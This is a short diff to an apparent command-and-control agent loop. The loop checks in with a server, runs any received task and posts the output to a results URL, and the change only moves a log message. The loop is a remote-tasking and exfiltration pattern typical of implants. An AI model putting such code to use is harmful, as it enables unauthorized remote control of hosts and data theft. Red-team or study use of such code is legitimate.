@@ -30,9 +30,9 @@ def run_agent_loop():
             if "task" in response_checkin:
                 received_task = response_checkin["task"]
                 if received_task and received_task != "no-task-for-now":
+                    print("[INFO] Task received")
                     command_out = tasking.execute_task(received_task)
                     comms.send_results(results_url, agent_id, command_out)
-                    print("[INFO] Task executed and result sent.")
 
         else:
             print(f"Check-in failed. Trying again in {sleep_interval}s.")
